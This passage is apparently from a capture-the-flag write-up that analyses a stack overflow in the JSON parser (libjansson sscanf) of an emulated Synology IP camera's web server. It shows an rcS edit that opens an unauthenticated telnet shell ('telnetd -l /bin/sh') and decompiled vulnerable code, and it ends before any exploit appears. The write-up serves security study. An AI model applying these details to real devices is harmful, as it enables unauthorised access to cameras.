<!DOCTYPE html><html lang="en"><head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5">
    <meta name="description" content="RWCTF 6th - Let’s party in the house score:378 solve_count:6 pwn, Panasonic (PCSL), difficulty:Schrödinger 12Oh, no, in the middle of our party, there was a strange baby cry coming from the IP Camera.">
<meta property="og:type" content="article">
<meta property="og:title" content="RWCTF 6th - Let’s party in the house">
<meta property="og:url" content="http://example.com/2024/03/10/RWCTF-6th-Let%E2%80%99s-party-in-the-house/index.html">
<meta property="og:site_name" content="z1r0's blog">
<meta property="og:description" content="RWCTF 6th - Let’s party in the house score:378 solve_count:6 pwn, Panasonic (PCSL), difficulty:Schrödinger 12Oh, no, in the middle of our party, there was a strange baby cry coming from the IP Camera.">
<meta property="og:locale" content="en_US">
<meta property="article:published_time" content="2024-03-10T14:04:43.000Z">
<meta property="article:modified_time" content="2024-03-12T02:15:22.111Z">
<meta property="article:author" content="z1r0">
<meta property="article:tag" content="RW">
<meta name="twitter:card" content="summary">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>RWCTF 6th - Let’s party in the house</title>
    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
      <link rel="alternate" href="/true" title="z1r0's blog" type="application/atom+xml">
    
	<!-- mathjax -->
	
<meta name="generator" content="Hexo 6.1.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a target="_blank" rel="noopener" href="https://github.com/z1r00?tab=repositories">Projects</a></li><!--
     --><!--
       --><li><a href="/links/">links</a></li><!--
     -->
      </ul>
    </span>
    <br>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="Previous post" href="/2024/03/22/Pwn2Own-CVE-2024-1179-TP-Link-Omada-ER605/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="Next post" href="/2023/12/31/2023%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2024/03/10/RWCTF-6th-Let%E2%80%99s-party-in-the-house/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2024/03/10/RWCTF-6th-Let%E2%80%99s-party-in-the-house/&amp;text=RWCTF 6th - Let’s party in the house"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2024/03/10/RWCTF-6th-Let%E2%80%99s-party-in-the-house/&amp;title=RWCTF 6th - Let’s party in the house"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2024/03/10/RWCTF-6th-Let%E2%80%99s-party-in-the-house/&amp;is_video=false&amp;description=RWCTF 6th - Let’s party in the house"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=RWCTF 6th - Let’s party in the house&amp;body=Check out this article: http://example.com/2024/03/10/RWCTF-6th-Let%E2%80%99s-party-in-the-house/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2024/03/10/RWCTF-6th-Let%E2%80%99s-party-in-the-house/&amp;title=RWCTF 6th - Let’s party in the house"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2024/03/10/RWCTF-6th-Let%E2%80%99s-party-in-the-house/&amp;title=RWCTF 6th - Let’s party in the house"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2024/03/10/RWCTF-6th-Let%E2%80%99s-party-in-the-house/&amp;title=RWCTF 6th - Let’s party in the house"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2024/03/10/RWCTF-6th-Let%E2%80%99s-party-in-the-house/&amp;title=RWCTF 6th - Let’s party in the house"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2024/03/10/RWCTF-6th-Let%E2%80%99s-party-in-the-house/&amp;name=RWCTF 6th - Let’s party in the house&amp;description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2024/03/10/RWCTF-6th-Let%E2%80%99s-party-in-the-house/&amp;t=RWCTF 6th - Let’s party in the house"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#RWCTF-6th-Let%E2%80%99s-party-in-the-house"><span class="toc-number">1.</span> <span class="toc-text">RWCTF 6th - Let’s party in the house</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E9%85%8D%E7%BD%AE-amp-%E5%90%AF%E5%8A%A8"><span class="toc-number">1.1.</span> <span class="toc-text">题目配置&amp;启动</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">1.2.</span> <span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Poc-amp-%E8%B0%83%E8%AF%95"><span class="toc-number">1.3.</span> <span class="toc-text">Poc&amp;调试</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">1.4.</span> <span class="toc-text">漏洞利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reference"><span class="toc-number">1.5.</span> <span class="toc-text">Reference</span></a></li></ol></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index py4">
        
        <article class="post" itemscope="" itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        RWCTF 6th - Let’s party in the house
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
        <span itemprop="name">z1r0</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2024-03-10T14:04:43.000Z" itemprop="datePublished">2024-03-10</time>
        
      
    </div>


      
    <div class="article-category">
        <i class="fas fa-archive"></i>
        <a class="category-link" href="/categories/WP/">WP</a>
    </div>


      
    <div class="article-tag">
        <i class="fas fa-tag"></i>
        <a class="tag-link-link" href="/tags/RW/" rel="tag">RW</a>
    </div>


    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <h1 id="RWCTF-6th-Let’s-party-in-the-house"><a href="#RWCTF-6th-Let’s-party-in-the-house" class="headerlink" title="RWCTF 6th - Let’s party in the house"></a>RWCTF 6th - Let’s party in the house</h1><blockquote>
<p><code>score:378</code> <code>solve_count:6</code></p>
<p><code>pwn</code>, <code>Panasonic (PCSL)</code>, <code>difficulty:Schrödinger</code></p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Oh, no, in the middle of our party, there was a strange baby cry coming from the IP Camera.</span><br><span class="line">There is only one service in the device, can you figure out the baby crying? flag path: /flag</span><br></pre></td></tr></tbody></table></figure>

<p><code>nc 47.88.48.133 7777</code></p>
<p><a target="_blank" rel="noopener" href="https://github.com/chaitin/Real-World-CTF-6th-Challenges">https://github.com/chaitin/Real-World-CTF-6th-Challenges</a></p>
</blockquote>
<h2 id="题目配置-amp-启动"><a href="#题目配置-amp-启动" class="headerlink" title="题目配置&amp;启动"></a>题目配置&amp;启动</h2><p>给了一个run.sh，直接启动，题目环境就可以跑起来。账号密码是<code>root:root</code>，启动之后一直有杂乱的信息，搜索之后发现有telnetd，重新打包一下rcS，在rcS里加上<code>telnetd -p 8802 -l /bin/sh</code>，此时8802就会开启telnet，在docker里加上映射之后<code>nc 127.0.0.1 8802</code>即可获得shell</p>
<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="comment"># source profile_prjcfg on /etc/init.d/rcS (init script cycle) and /etc/profile (after startup cycle)</span></span><br><span class="line"><span class="built_in">source</span> /etc/profile_prjcfg</span><br><span class="line">telnetd -p 9901 -l /bin/sh</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># fstab devices create</span></span><br><span class="line">mount -a</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"ker"</span> &gt; /proc/nvt_info/bootts</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"rcS"</span> &gt; /proc/nvt_info/bootts</span><br><span class="line"></span><br><span class="line"><span class="comment"># To run /etc/init.d/S* script</span></span><br><span class="line"><span class="keyword">for</span> initscript <span class="keyword">in</span> /etc/init.d/S[0-9][0-9]*</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">	<span class="keyword">if</span> [ -x <span class="variable">$initscript</span> ]; <span class="keyword">then</span></span><br><span class="line">		<span class="built_in">echo</span> <span class="string">"[Start] <span class="variable">$initscript</span>"</span></span><br><span class="line">		<span class="variable">$initscript</span></span><br><span class="line">	<span class="keyword">fi</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"rcS"</span> &gt; /proc/nvt_info/bootts</span><br><span class="line">telnetd -p 8802 -l /bin/sh</span><br></pre></td></tr></tbody></table></figure>

<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">qemu-system-arm \</span><br><span class="line">	-m 1024 \</span><br><span class="line">	-M virt,highmem=off \</span><br><span class="line"> 	-kernel zImage \</span><br><span class="line">    	-initrd player.cpio \</span><br><span class="line">	-nic user,hostfwd=tcp:0.0.0.0:8801-:80,hostfwd=tcp:0.0.0.0:8802-:8802 \</span><br><span class="line"> 	-nographic</span><br></pre></td></tr></tbody></table></figure>

<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> 450 synodebu  0:01 telnetd -p 8802 -l /bin/sh</span><br><span class="line">  453 synodebu  0:00 -sh</span><br><span class="line">  545 synodebu  1:46 /bin/webd</span><br><span class="line"> 2452 synodebu  0:00 /bin/sh</span><br><span class="line"> 2717 synodebu  0:00 /bin/sh</span><br><span class="line">16809 synodebu  0:00 ps</span><br></pre></td></tr></tbody></table></figure>

<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>发现这个<a target="_blank" rel="noopener" href="https://www.synology.com/en-global/security/advisory/Synology_SA_23_15">设备</a>在Pwn2Own 2023上被利用，并且<a target="_blank" rel="noopener" href="https://teamt5.org/en/posts/teamt5-pwn2own-contest-experience-sharing-and-vulnerability-demonstration/">TeamT5</a>公开了一些细节，在<code>/lib/libjansson.so.4.7.0</code>中进行json代码解析的时候发生了溢出漏洞，经过对比发现比赛版本正好存在此漏洞</p>
<p>在parse_object这个函数中，解析key的时候发生了溢出</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">json_t</span> *__fastcall <span class="title function_">parse_object</span><span class="params">(<span class="type">lex_t</span> *lex, <span class="type">int</span> flags, <span class="type">json_error_t</span> *error)</span></span><br><span class="line">{</span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">char</span> v9[<span class="number">32</span>]; <span class="comment">// [sp+14h] [bp-40h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v10[<span class="number">12</span>]; <span class="comment">// [sp+34h] [bp-20h] BYREF</span></span><br><span class="line">  <span class="type">size_t</span> len; <span class="comment">// [sp+40h] [bp-14h] BYREF</span></span><br><span class="line">  <span class="type">int</span> value; <span class="comment">// [sp+44h] [bp-10h]</span></span><br><span class="line">  <span class="type">void</span> *key; <span class="comment">// [sp+48h] [bp-Ch]</span></span><br><span class="line">  <span class="type">json_t</span> *object; <span class="comment">// [sp+4Ch] [bp-8h]</span></span><br><span class="line"></span><br><span class="line">  object = j_json_object();</span><br><span class="line">  <span class="keyword">if</span> ( !object )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  lex_scan(lex, error);</span><br><span class="line">  <span class="keyword">if</span> ( lex-&gt;token == <span class="string">'}'</span> )</span><br><span class="line">    <span class="keyword">return</span> object;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  {</span><br><span class="line">    <span class="keyword">if</span> ( lex-&gt;token != <span class="number">0x100</span> )</span><br><span class="line">    {</span><br><span class="line">      error_set(error, lex, <span class="string">"string or '}' expected"</span>);</span><br><span class="line">      <span class="keyword">goto</span> LABEL_28;</span><br><span class="line">    }</span><br><span class="line">    key = lex_steal_string(lex, &amp;len);</span><br><span class="line">    <span class="keyword">if</span> ( !key )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">memchr</span>(key, <span class="number">0</span>, len) )</span><br><span class="line">    {</span><br><span class="line">      jsonp_free(key);</span><br><span class="line">      error_set(error, lex, <span class="string">"NUL byte in object key not supported"</span>);</span><br><span class="line">      <span class="keyword">goto</span> LABEL_28;</span><br><span class="line">    }</span><br><span class="line">    v10[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    _isoc99_sscanf(key, <span class="string">"%s %s"</span>, v9, v10);      <span class="comment">// stack-based buffer overflow</span></span><br><span class="line">    <span class="keyword">if</span> ( (flags &amp; <span class="number">1</span>) != <span class="number">0</span> &amp;&amp; j_json_object_get(object, v9) )</span><br><span class="line">    {</span><br><span class="line">      jsonp_free(key);</span><br><span class="line">      error_set(error, lex, <span class="string">"duplicate object key"</span>);</span><br><span class="line">      <span class="keyword">goto</span> LABEL_28;</span><br><span class="line">    }</span><br><span class="line">    lex_scan(lex, error);</span><br><span class="line">    <span class="keyword">if</span> ( lex-&gt;token != <span class="number">58</span> )</span><br><span class="line">    {</span><br><span class="line">      jsonp_free(key);</span><br><span class="line">      error_set(error, lex, <span class="string">"':' expected"</span>);</span><br><span class="line">      <span class="keyword">goto</span> LABEL_28;</span><br><span class="line">    }</span><br><span class="line">    lex_scan(lex, error);</span><br><span class="line">    value = parse_value(lex, flags, error);</span><br><span class="line">    <span class="keyword">if</span> ( !value )</span><br><span class="line">    {</span><br><span class="line">      jsonp_free(key);</span><br><span class="line">      <span class="keyword">goto</span> LABEL_28;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">if</span> ( v10[<span class="number">0</span>] )</span><br><span class="line">    {</span><br><span class="line">      v4 = sub_6A04(v10);</span><br><span class="line">      *(value + <span class="number">8</span>) = v4;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    {</span><br><span class="line">      *(value + <span class="number">8</span>) = <span class="number">0</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">if</span> ( sub_5170(object, v9, value) )</span><br><span class="line">    {</span><br><span class="line">      jsonp_free(key);</span><br><span class="line">      json_decref(value);</span><br><span class="line">      <span class="keyword">goto</span> LABEL_28;</span><br><span class="line">    }</span><br><span class="line">    json_decref(value);</span><br><span class="line">    jsonp_free(key);</span><br><span class="line">    lex_scan(lex, error);</span><br><span class="line">    <span class="keyword">if</span> ( lex-&gt;token != <span class="string">','</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    lex_scan(lex, error);</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">if</span> ( lex-&gt;token == <span class="string">'}'</span> )</span><br><span class="line">    <span class="keyword">return</span> object;</span><br><span class="line">  error_set(error, lex, <span class="string">"'}' expected"</span>);</span><br><span class="line">LABEL_28:</span><br><span class="line">  json_decref(object);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>发现了漏洞点之后需要去找触发此漏洞的方式，经过与libjansson这个公开json解析库进行源码对比的时候发现<code>parse_object</code>会被<code>parse_value</code>调用，<code>parse_value</code>会被<code>parse_json</code>调用，最后<code>parse_json</code>会被<code>json_loads/json_loadb/json_loadf/json_loadfd/json_load_callback</code>这5个函数调用</p>
<p>最后在grep筛选的时候只有<code>json_loads</code>这个接口在服务器中被调用，所以调用链为<code>parse_object-&gt;parse_value-&gt;json_loads</code></p>
<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">Binary file ./bin/synoaid matches</span><br><span class="line">Binary file ./bin/diag matches</span><br><span class="line">Binary file ./bin/systemd matches</span><br><span class="line">Binary file ./bin/webd matches</span><br><span class="line">Binary file ./bin/webd.id0 matches</span><br><span class="line">Binary file ./bin/central_server matches</span><br><span class="line">Binary file ./bin/webd.i64 matches</span><br><span class="line">Binary file ./bin/synoactiond matches</span><br><span class="line">Binary file ./www/uistrings/uistrings.cgi.i64 matches</span><br><span class="line">Binary file ./www/uistrings/uistrings.cgi matches</span><br><span class="line">Binary file ./www/uistrings/uistrings.cgi.id0 matches</span><br><span class="line">Binary file ./www/cgi2/factory.cgi.i64 matches</span><br><span class="line">Binary file ./www/cgi2/fwupgrade.cgi matches</span><br><span class="line">Binary file ./www/cgi2/config.cgi matches</span><br><span class="line">Binary file ./www/cgi2/factorydefault.cgi matches</span><br><span class="line">Binary file ./www/cgi2/param.cgi matches</span><br><span class="line">Binary file ./www/cgi2/factory.cgi matches</span><br><span class="line">Binary file ./www/camera-cgi/synocam_fw_upgrade.cgi.i64 matches</span><br><span class="line">Binary file ./www/camera-cgi/synocam_param.cgi.i64 matches</span><br><span class="line">Binary file ./www/camera-cgi/synocam_fw_upgrade.cgi matches</span><br><span class="line">Binary file ./www/camera-cgi/synocam_param.cgi matches</span><br><span class="line">Binary file ./www/camera-cgi/synocam_log_retrieve.cgi matches</span><br><span class="line">Binary file ./www/camera-cgi/synocam_reset.cgi matches</span><br><span class="line">Binary file ./www/camera-cgi/synocam_system_report.cgi matches</span><br><span class="line">Binary file ./lib/libjansson.so.4.7.0 matches</span><br><span class="line">Binary file ./lib/libjansson.so.4.7.0.id0 matches</span><br><span class="line">Binary file ./lib/libutil.so matches</span><br><span class="line">Binary file ./opt/onvif/wsdd matches</span><br><span class="line">Binary file ./opt/onvif/onvifd matches</span><br></pre></td></tr></tbody></table></figure>

<p>有很多都调用了<code>json_loads</code>，无法确定哪一个，发现webd是这个摄像头的webserver，所以对其进行简要分析一下</p>
<p>在webd中发现了处理函数<code>sub_35CEC</code></p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">handle_main</span><span class="params">(<span class="type">int</span> *a1)</span></span><br><span class="line">{</span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// r0</span></span><br><span class="line"></span><br><span class="line">  sub_30F24();</span><br><span class="line">  sub_30E04();</span><br><span class="line">  v2 = open(<span class="string">"/tmp/ConnInfo"</span>, <span class="number">193</span>, <span class="number">420</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v2 == <span class="number">-1</span> )</span><br><span class="line">  {</span><br><span class="line">    <span class="keyword">if</span> ( *_errno_location() != <span class="number">17</span> )</span><br><span class="line">      <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Failed to touch ConnInfo file [%m].\n"</span>);</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  {</span><br><span class="line">    close(v2);</span><br><span class="line">  }</span><br><span class="line">  sub_24C64(a1, <span class="string">"/syno-api"</span>, (<span class="type">int</span>)sub_35CEC, <span class="number">0</span>);</span><br><span class="line">  sub_24D94((<span class="type">int</span>)a1, <span class="string">"/heartbeat/connect"</span>, (<span class="type">int</span>)sub_331F4, (<span class="type">char</span>)sub_33EDC, (<span class="type">int</span>)sub_2D6CC, (<span class="type">int</span>)sub_31BDC, <span class="number">0</span>);</span><br><span class="line">  sub_24D94((<span class="type">int</span>)a1, <span class="string">"/webstream/connect"</span>, (<span class="type">int</span>)sub_3323C, (<span class="type">char</span>)sub_2E97C, (<span class="type">int</span>)sub_2D360, (<span class="type">int</span>)sub_2D870, <span class="number">0</span>);</span><br><span class="line">  sub_24D94((<span class="type">int</span>)a1, <span class="string">"/aievent/connect"</span>, (<span class="type">int</span>)sub_33284, (<span class="type">char</span>)sub_2E8F4, (<span class="type">int</span>)sub_2E7DC, (<span class="type">int</span>)sub_2D8F8, <span class="number">0</span>);</span><br><span class="line">  v3 = sub_2F5DC();</span><br><span class="line">  v4 = sub_2F670(v3);</span><br><span class="line">  v5 = sub_30BB4(v4);</span><br><span class="line">  v6 = sub_30C48(v5);</span><br><span class="line">  sub_2F704(v6);</span><br><span class="line">  v7 = sub_2F798();</span><br><span class="line">  v8 = sub_30CDC(v7);</span><br><span class="line">  v9 = sub_30D70(v8);</span><br><span class="line">  <span class="keyword">return</span> sub_30E90(v9);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p><code>sub_35CEC</code>这里主要进行路由请求到后端不同的cgi处理功能点，那就需要判断出是否有功能点存在未授权访问，如果这个函数中没有找到路由请求，那就会调用<code>/www/camera-cgi/synocam_param.cgi</code>这个cgi</p>
<figure class="highlight c++"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span 